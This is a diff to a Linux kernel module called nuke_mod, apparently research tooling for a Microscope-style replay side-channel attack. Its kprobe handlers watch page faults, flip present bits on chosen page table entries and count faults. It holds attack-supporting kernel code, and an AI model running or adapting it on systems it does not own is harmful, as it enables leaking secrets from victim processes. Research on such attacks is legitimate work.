@@ -57,7 +57,6 @@ static struct kprobe kp = {
 };
 
 // Microscope variables
-extern pte_t *fault_pte;
 static uint64_t fault_cnt = 0, fault_fault_cnt = 0;
 
 // APA variables
@@ -133,12 +132,12 @@ static ssize_t device_write(struct file *file, const char __user *buffer, size_t
         break;
 		
 	case START_MONITORING:
-		pr_info("On the lookout for page faults of the stored addresses");
+		pr_info("On the lookout for page faults of the stored addresses\n");
 		monitoring = 1;
 		break;
 
 	case STOP_MONITORING:
-		pr_info("Attack complete: I will forget everything you told me down here");
+		pr_info("Attack complete: I will forget everything you told me down here\n");
 		monitoring = 0;
 		clean_up_stored_addresses(&nuke_info_head);
 		break;
@@ -146,11 +145,11 @@ static ssize_t device_write(struct file *file, const char __user *buffer, size_t
 	case WAIT:
 		spin_lock(&lock_for_waiting);
 		if (done == 1) {
-			pr_info("Letting thread 0 continue");
+			pr_info("Letting thread 0 continue\n");
 			done = 0;
 			spin_unlock(&lock_for_waiting);
 		} else {
-			pr_info("Waiting for magic batch to happen on thread 0");
+			pr_info("Waiting for magic batch to happen on thread 0\n");
 			spin_unlock(&lock_for_waiting);
 			while (done != 1) {;;}
 		}
@@ -229,17 +228,21 @@ struct file_operations Fops = {
  */
 static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
 {
+    pte_t pte, temp_pte, *faulting_pte;
+    faulting_pte = (pte_t *) regs->di;
+    pte = *faulting_pte;
+
 	fault_fault_cnt++;
-	pr_info("Nuke_mod: Fult-on-Fault counter %llu, fault counter %llu\n", fault_cnt, fault_fault_cnt);
+	pr_info("fault-on-fault\n");
 
     // Cancel this nuke
-	if (fault_pte) {
-		*fault_pte = pte_set_flags(*fault_pte, _PAGE_PRESENT);
-		pr_info("Nuke_mod: Fault-on-Fault resetting present bit %llu\n", fault_cnt);
-	}
+	if(!(pte_flags(pte) & _PAGE_PRESENT) && (pte_flags(pte) & _PAGE_PROTNONE)) {
+        temp_pte = pte_set_flags(pte, _PAGE_PRESENT);
+        set_pte(faulting_pte, temp_pte);
+    }
 
     // Mark attack as off
-	pr_info("Nuke_mod: Fault-on-Fault. Attack failed %llu. Remove nuke_mod and restart.\n", fault_cnt);
+	monitoring = 0;
 
 	// We let the kprobe handler to handle the page fault
 	return 0;
@@ -251,10 +254,10 @@ static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
  */
 static int pre_handler(struct kprobe *p, struct pt_regs *regs) { return 0; }
 
-static int pte_in_list(int v0) 
+static int pte_in_list(uint64_t v0) 
 {
 	// Loop over list of addresses
-	int v1;
+	uint64_t v1;
 	struct nuke_info_t *tmp = nuke_info_head;
 	while(tmp != NULL) {
 
@@ -263,6 +266,8 @@ static int pte_in_list(int v0)
 		if (v0 == v1) {
 			return 1;
 		}
+
+        tmp = tmp->next;
 	}
 
 	return 0;
@@ -270,52 +275,61 @@ static int pte_in_list(int v0)
 
 static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
 {
-	uint64_t v0 = 0;
+	uint64_t v0 = 0, v1 = 0;
+    pte_t pte, temp_pte, *faulting_pte;
+    faulting_pte = (pte_t *) regs->di;	// get arg from notify_attack
+    pte = *faulting_pte;
 
-    // fault_pte is set in the kernel (that's why it's extern here)
-	if (fault_pte) {
+	if (faulting_pte) {
 
 		// Note that this does not handle multi-threading
 		if (monitoring == 1) {
 
-			pr_info("Invoked fault handler %lld", fault_cnt);
-
 			// Check if the pte of the current page fault is of interest
-			v0 = pte_pfn(*fault_pte);
+			v0 = pte_pfn(*faulting_pte);
+            v1 = pte_pfn(*(special.nuke_pte));
 			if (pte_in_list(v0) == 1) {
 
-				// Count fault
-				fault_cnt++;
-				pr_info("Page fault count %lld", fault_cnt);
+                if(!(pte_flags(pte) & _PAGE_PRESENT) && (pte_flags(pte) & _PAGE_PROTNONE)) {
+                    pr_info("Match bit!\n");
+                    temp_pte = pte_set_flags(pte, _PAGE_PRESENT);
+                    set_pte(faulting_pte, temp_pte);
+
+					// Count fault
+                	fault_cnt++;
+                }
 
 				// Ensure the special page page faults at its next access
-				if (fault_cnt == 1) {
-					if (pte_present(*(special.nuke_pte)))
-						*(special.nuke_pte) = pte_clear_flags(*(special.nuke_pte), _PAGE_PRESENT);
-					__flush_tlb_single(special.nuke_virtual_addr);
-				}
+				//if (fault_cnt == 1) {
+					//if (pte_present(*(special.nuke_pte)))
+					//	*(special.nuke_pte) = pte_clear_flags(*(special.nuke_pte), _PAGE_PRESENT);
+				//	__flush_tlb_single(special.nuke_virtual_addr);
+				//}
 				
 				// Check threshold
-				if (fault_cnt > 24) {
-					monitoring = 0;
-					done = 1;
-					pr_info("Putting thread 0 to sleep and waking up other threads now");
+				//if (fault_cnt > 24) {
+				//	monitoring = 0;
+				//	done = 1;
+				//	pr_info("Putting thread 0 to sleep and waking up other threads now");
 
-					msleep(3000);
-				}
+					//msleep(3000);
+				//}
 
-			} else if (v0 == pte_pfn(*(special.nuke_pte))) {
+		    } else if (v0 == v1) {
+				
+		        pr_info("Page fault reset after %lld\n", fault_cnt);
 				fault_cnt = 0;
-				pr_info("Page fault count %lld", fault_cnt);
 
 				// Clear stored addresses if present
-				struct nuke_info_t *tmp = nuke_info_head;
-				while(tmp != NULL) {
-					if (pte_present(*(tmp->nuke_pte)))
-						*(tmp->nuke_pte) = pte_clear_flags(*(tmp->nuke_pte), _PAGE_PRESENT);
-					__flush_tlb_single(tmp->nuke_virtual_addr);
-				}
+				//struct nuke_info_t *tmp = nuke_info_head;
+				//while(tmp != NULL) {
+					//if (pte_present(*(tmp->nuke_pte)))
+					//	*(tmp->nuke_pte) = pte_clear_flags(*(tmp->nuke_pte), _PAGE_PRESENT);
+				//	__flush_tlb_single(tmp->nuke_virtual_addr);
+				//}
 			}
+
+          //  pr_info("Outside!");
 		}
 	}
 }
